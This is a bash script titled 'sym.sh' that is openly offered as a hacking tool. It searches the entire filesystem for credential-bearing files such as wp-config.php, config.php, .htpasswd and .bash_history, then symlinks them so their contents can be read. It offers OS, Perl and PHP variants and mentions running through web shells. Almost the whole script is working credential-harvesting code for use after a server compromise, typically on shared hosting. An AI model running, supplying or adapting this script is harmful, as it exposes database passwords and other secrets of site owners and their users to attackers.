#!/bin/bash
# sym.sh by H.R.
# Standalone Symlinker Script
#     use OS or Perl based symlink methods
#
# USAGE: ./sym.sh <1|2|3>
#    option 1 will use OS based method
#    option 2 will use Perl based method
#    option 3 will use PHP based method
#
# EX for OS Method:   ./sym 1
# EX for Perl Method: ./sym 2
# EX for PHP Method:  ./sym 3
#

#Magic...
args=1
original=0
fname=lulz
# Usage details
function usage_info(){
cat << "EOT"
 sym.sh
     by H.R.
 A Standalone Symlinker Script
     Uses OS or Perl based symlink method to link to juicy files

 USAGE: ./sym.sh <1|2|3>
    option 1 will use OS based method (ln -s)
    option 2 will use Perl based method (symlink())
    option 3 will use PHP based method (symlink())

 EX for OS Method:   ./sym 1
 EX for Perl Method: ./sym 2
 EX for PHP Method:  ./sym 3

EOT
exit 0;
}

# Perl Symlink Method
function pl(){
for config in $(find / -name conf_global.php -o -name conf.php -o -name config.php -o -name wp-config.php -o -name config.inc.php -o -name connect.php -o -name configuration.php -o -name conf_global.php -o -name functions.php -o -name sql.php -o -name db.php -o -name db-conn.php -o -name security.php -o -name settings.php -o -name mk_conf.php -o -name service.pwd -o -name .htpasswd -o -name .bash_history -o -name .bashrc -o -name .profile -type f 2> /dev/null);
do
	echo $config
	for sym in $config; 
	do
		export sym
		export fname
		export original
		perl -e 'symlink($ENV{"sym"},$ENV{"fname"} . "." . $ENV{"original"});'
		original=$((original+1))

	done
done
}

# *nix OS Based Symlink Method
function OS(){
for config in $(find / -name conf_global.php -o -name conf.php -o -name config.php -o -name wp-config.php -o -name config.inc.php -o -name connect.php -o -name configuration.php -o -name conf_global.php -o -name functions.php -o -name sql.php -o -name db.php -o -name db-conn.php -o -name security.php -o -name settings.php -o -name mk_conf.php -o -name service.pwd -o -name .htpasswd -o -name .bash_history -o -name .bashrc -o -name .profile -type f 2> /dev/null);
do
	echo $config
	for sym in $config; do
		ln -s $sym $fname.$original
		original=$((original+1))
	done
done
}

# PHP Symlink Method (standard method)
function php_magic(){
for config in $(find / -name conf_global.php -o -name conf.php -o -name config.php -o -name wp-config.php -o -name config.inc.php -o -name connect.php -o -name configuration.php -o -name conf_global.php -o -name functions.php -o -name sql.php -o -name db.php -o -name db-conn.php -o -name security.php -o -name settings.php -o -name mk_conf.php -o -name service.pwd -o -name .htpasswd -o -name .bash_history -o -name .bashrc -o -name .profile -type f 2> /dev/null);
do
	echo $config
	for sym in $config; 
	do
		export sym
		export fname
		export original

		php -r "symlink('$sym', '$fname'.'.'.'$original');";
				
		original=$((original+1))

	done
done
}

# supply usage if not called properly
if [ -z "$1" ] || [ "$#" -ne "$args" ]; then
	usage_info
fi

#check for writable directory so no troubles making links
if [ ! \( -w "." \) ]; then
	echo "%ERROR: current directory is not writable dummy! try running somewhere else like /tmp or chmod dir!"
	exit 0;
else
	echo
	echo 'Attempting to Symlink any juicy files we can find using OS based symlink method...'
fi	

echo

#Check choice and fork accordingly
if [ "$1" -eq 1 ]; then
	OS
fi

if [ "$1" -eq 2 ]; then
	pl
fi

if [ "$1" -eq 3 ]; then
	php_magic
fi

echo
echo 'Symlinking completed, if successful it should show up in directory listing below:'
echo

ls -lua --color

echo
echo "You can use 'cat lulz.x' to read the content of the symlinked config files"
echo
echo "Until next time, Enjoy!"
	
exit 0;
#To-Do:
# Simulate threading but shorting the find request by doing in chunks and firing off in background. Will help speed up and to reduce timeouts when run via web shells (PHP issue). 
#EOF
